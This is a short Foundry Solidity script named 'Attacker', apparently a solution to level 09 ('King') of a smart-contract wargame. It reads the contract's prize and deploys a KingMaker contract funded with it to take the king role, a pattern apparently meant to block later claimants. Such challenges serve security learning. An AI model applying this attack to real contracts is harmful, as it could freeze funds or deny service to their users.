// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel09.sol";
import "../src/level09.sol";

contract Attacker is Script {
    King level09 = King(payable(0x3d8A1317A91B2b9f53A108E00dA27aa2DacD7d90));

    function run() external {
        uint256 prize = level09.prize();

        vm.broadcast();
        (new KingMaker){value: prize}();
    }
}
